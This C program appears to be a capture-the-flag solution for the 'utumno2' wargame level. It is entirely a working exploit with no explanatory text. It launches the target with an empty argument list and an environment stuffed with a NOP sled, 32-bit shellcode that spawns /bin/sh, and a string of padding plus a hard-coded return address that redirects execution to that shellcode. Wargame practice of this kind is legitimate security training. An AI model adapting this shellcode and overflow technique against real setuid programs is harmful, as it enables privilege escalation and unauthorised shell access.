#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char** argv) {
	printf("%d \n", argc);
	char* arg[] = {0x0};
	char* envp[] = {"","","",
			"", "", "",
			"", "",
			"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80",
			"AAAAAAAAAAAAAAAA\xb0\xdf\xff\xff",
			NULL};
	execve("/utumno/utumno2", arg, envp);
	perror("execve");
}
